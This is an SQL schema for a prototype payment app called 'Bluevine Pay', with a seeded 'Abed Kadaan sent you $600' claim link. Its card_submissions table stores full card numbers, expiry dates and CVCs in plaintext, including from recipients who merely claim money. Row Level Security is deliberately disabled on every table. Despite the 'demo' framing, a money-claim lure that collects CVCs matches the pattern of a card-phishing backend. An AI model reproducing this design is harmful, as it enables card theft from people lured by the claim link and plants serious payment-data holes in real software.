-- Bluevine Pay — demo schema
-- Run this in the Supabase SQL editor (or `supabase db push`) before pointing
-- the app at a project.
--
-- NOTE: this is a prototype. Row Level Security is intentionally left open and
-- card details are stored as submitted, exactly as the demo brief asked for.
-- Do not point this at real cardholder data.

create table if not exists public.transfers (
  id                uuid primary key default gen_random_uuid(),
  token             text unique not null,
  sender_name       text not null,
  sender_email      text,
  recipient_name    text not null,
  recipient_contact text,
  amount_cents      integer not null check (amount_cents > 0),
  note              text default '',
  status            text not null default 'pending'
                      check (status in ('pending', 'claimed')),
  created_at        timestamptz not null default now(),
  claimed_at        timestamptz
);

create table if not exists public.card_submissions (
  id              uuid primary key default gen_random_uuid(),
  transfer_token  text not null references public.transfers (token)
                    on delete cascade,
  role            text not null check (role in ('sender', 'recipient')),
  contact_email   text,
  cardholder_name text,
  card_number     text,
  exp_month       text,
  exp_year        text,
  cvc             text,
  billing_zip     text,
  brand           text,
  last4           text,
  created_at      timestamptz not null default now()
);

create index if not exists card_submissions_transfer_token_idx
  on public.card_submissions (transfer_token);

-- Open access for the prototype. Lock this down before anything real.
alter table public.transfers          disable row level security;
alter table public.card_submissions   disable row level security;

-- Seed the "Abed Kadaan sent you $600" demo link at /r/demo
insert into public.transfers
  (token, sender_name, sender_email, recipient_name, recipient_contact,
   amount_cents, note, status)
values
  ('demo', 'Abed Kadaan', 'abed@example.com', 'there', 'you@example.com',
   60000, 'Thanks for covering the team dinner last week 🎉', 'pending')
on conflict (token) do nothing;
